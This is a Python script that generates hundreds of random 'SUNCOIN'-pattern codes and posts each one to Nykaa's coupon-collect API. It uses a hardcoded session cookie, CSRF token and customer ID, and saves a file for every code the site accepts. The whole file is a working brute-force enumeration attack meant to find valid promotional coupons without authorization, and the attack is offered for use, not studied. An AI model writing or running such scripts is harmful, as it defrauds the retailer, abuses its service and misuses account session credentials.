import random
import requests
import string
import time



# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN"
#     suffix = "525"
#     codes = set()

#     while len(codes) < limit:
#         part1 = random.choice(string.ascii_uppercase)  # Random letter
#         part2 = random.choice(string.ascii_uppercase)  # Random letter
#         part3 = random.choice(string.ascii_uppercase)  # Random letter

#         code = f"{prefix}{part1}{part2}{part3}{suffix}"
#         codes.add(code)

#     return list(codes)


# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN"
#     suffix = "500"
#     codes = set()

#     while len(codes) < limit:
#         letter = random.choice(string.ascii_uppercase)     # One random uppercase letter
#         digits = ''.join(random.choices(string.digits, k=2))  # Two random digits

#         code = f"{prefix}{letter}{digits}{suffix}"
#         codes.add(code)

#     return list(codes)


# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN400"
#     codes = set()

#     while len(codes) < limit:
#         digit = random.choice(string.digits)  # One random digit
#         letters = ''.join(random.choices(string.ascii_uppercase, k=2))  # Two uppercase letters

#         code = f"{prefix}{digit}{letters}"
#         codes.add(code)


#     return list(codes)

# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN300"
#     codes = set()

#     while len(codes) < limit:
#         digit = random.choice(string.digits)  # One random digit
#         letters = ''.join(random.choices(string.ascii_uppercase, k=3))  # Two uppercase letters

#         code = f"{prefix}{letters}"
#         codes.add(code)

#     return list(codes)

# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN300"
#     codes = set()

#     while len(codes) < limit:
#         letter1 = random.choice(string.ascii_uppercase)    # First random letter
#         digit = random.choice(string.digits)               # Random digit
#         letter2 = random.choice(string.ascii_uppercase)    # Second random letter

#         code = f"{prefix}{letter1}{digit}{letter2}"
#         codes.add(code)

#     return list(codes)

# def generate_structured_codes(limit=100):
#     prefix = "SUNCOIN50"
#     codes = set()

#     while len(codes) < limit:
#         letter1 = random.choice(string.ascii_uppercase)    # First random letter
#         digit = random.choice(string.ascii_uppercase)               # Random digit
#         letter2 = random.choice(string.ascii_uppercase)    # Second random letter

#         code = f"{prefix}{letter1}{digit}{letter2}"
#         codes.add(code)

#     return list(codes)

def generate_structured_codes(limit=100):
    prefix = "SUNCOIN200"
    # suffix = "525"
    codes = set()

    while len(codes) < limit:
        part1 = random.choice(string.ascii_uppercase)  # Random letter
        part2 = random.choice(string.ascii_uppercase)  # Random letter
        part3 = random.choice(string.ascii_uppercase)  # Random letter

        code = f"{prefix}{part1}{part2}{part3}"
        codes.add(code)
    return list(codes)



def test_coupon_code(session, code):
    url = "https://www.nykaa.com/fe-api/cartapi/v1/coupon/collect"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "x-csrf-token": "gtdn28qscYwiZ6Sk",  # still may need to be dynamic
        "Cookie": "countryCode=IN; storeId=nykaa; PHPSESSID=QHgv1vSHh3GyfhH1750934407375;"  # ensure this is fresh
    }

    payload = {
        "app_version": "9.9.9",
        "source": "react",
        "domain": "nykaa",
        "countryCode": "IN",
        "currencyCode": "INR",
        "couponCodeList": [code],
        "customerDetail": {
            "customerId": "83751744",
            "loyalUser": False,
            "registeredUser": True,
            "groupId": "1"
        },
        "deviceType": "WEBSITE",
        "utmParam": "9.9.9"
    }

    try:
        response = session.post(url, json=payload, headers=headers, timeout=10)
        print(f"\n[Testing Code: {code}]")
        print("Status Code:", response.status_code)
        print("Raw Response Text:", response.text)

        result = response.json()

        message = result.get("message", "")

        if result.get("success") or "applied" in message.lower():
            # Create a file named after the valid code
                filename = f"{code}.txt"
                with open(filename, "w", encoding="utf-8") as log:
                    log.write(f"{code} → {message}\n")
                print(f"[VALID] {code} → File created: {filename}")

    except Exception as e:
        print(f"[ERROR] {code}: {e}")

# === Run with session reuse ===

codes = generate_structured_codes(limit=300)
session = requests.Session()

for code in codes:
    test_coupon_code(session, code)
    time.sleep(0.1)  # much smaller delay